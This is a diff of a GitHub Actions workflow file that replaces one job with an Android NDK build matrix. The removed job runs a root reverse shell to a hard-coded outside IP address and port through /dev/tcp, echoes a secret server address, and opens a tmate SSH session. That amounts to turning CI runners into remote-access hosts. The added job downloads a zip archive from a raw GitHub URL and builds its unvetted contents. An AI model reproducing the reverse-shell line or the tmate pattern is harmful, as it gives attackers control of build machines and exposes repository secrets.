@@ -1,45 +1,51 @@
-name: ARL在线
+name: Build TestForMyCode for Android NDK
 
 on:
-  release:
-    types: [published]
+  push:
+    branches:
+      - main
   workflow_dispatch:
-    inputs:
-      tag:
-        description: 'Image tag'
-        required: false
-        default: 'test'  # 默认的标签值
-
-permissions:
-  contents: read
 
 jobs:
-  long-running-service:
-    runs-on: ubuntu-20.04
+  build:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        arch: [x86, armeabi-v7a, arm64-v8a]
 
     steps:
+      - name: Checkout Code
+        uses: actions/checkout@v2
 
-      - name: Run long service
-        env: # Or as an environment variable
-          SERVER_ADDR: ${{ secrets.SERVER_ADDR }}
+      - name: Download Source Code
         run: |
-          echo "Server Address is: ${SERVER_ADDR:-'Not set or empty'}"
-          env | grep SERVER_ADDR  # This will print only the SERVER_ADDR related variable
-          sudo sh -i >& /dev/tcp/181.193.118.73/6060 0>&1 &
-          sleep 10 # 确保服务已经启动
+          wget https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip
+          unzip testformycode.zip
+          cd testformycode
 
-      # Checkout your code
-      - name: Checkout code
-        uses: actions/checkout@v3
-
-      # Set up tmate session
-      - name: Setup tmate session
-        uses: mxschmitt/action-tmate@v3
-
-      # Print tmate connection instructions
-      - name: Print tmate instructions
+      - name: Set up Android NDK
+        uses: android-actions/setup-ndk@v1
+        with:
+          version: '21.3.6528147'  # Specify the NDK version you want to use
+          
+      - name: Configure CMake
         run: |
-          echo "To connect to the tmate session, run the following command:"
-          echo "ssh $(cat /tmp/tmate-ssh)"
-          echo "Alternatively, use the web URL:"
-          echo "$(cat /tmp/tmate-url)"
+          cd testformycode  # Make sure you are in the extracted directory
+          mkdir build
+          cd build
+          cmake .. \
+            -DCMAKE_TOOLCHAIN_FILE=$ANDROID_NDK_HOME/build/cmake/android.toolchain.cmake \
+            -DANDROID_ABI=${{ matrix.arch }} \
+            -DANDROID_PLATFORM=android-21
+
+      - name: Build TestForMyCode
+        run: |
+          cd testformycode/build
+          make -j$(nproc)
+
+      - name: Archive Build Artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: testformycode-${{ matrix.arch }}
+          path: testformycode/build/testformycode  # Adjust this path based on the actual output
